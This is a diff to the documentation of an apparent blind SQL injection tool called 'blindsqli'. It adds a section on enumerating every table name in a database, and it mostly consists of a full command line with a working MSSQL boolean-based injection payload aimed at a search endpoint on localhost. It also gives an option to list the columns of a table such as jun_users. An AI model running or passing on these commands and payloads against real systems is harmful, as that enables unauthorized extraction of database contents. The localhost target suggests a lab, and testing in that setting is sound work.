@@ -138,6 +138,19 @@ python -m blindsqli extract --url http://host/api/search --method POST \
   --preset first-table
 ```
 
+**Extract ALL table names (not just the first):** use `enumerate` instead of
+`extract`.
+
+```bash
+python -m blindsqli enumerate --url http://localhost:3000/search --method POST \
+  --body-mode json --param "[0].value" --json-template '[{"value":"juniper"}]' \
+  --base-payload "juniper' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)-- " \
+  --dialect mssql -v
+```
+
+It prints every table name. Add `--what columns --table jun_users` to list a
+table's columns instead.
+
 **Extract something other than the first table name:** drop `--preset` and give
 your own SQL that returns one value.
 
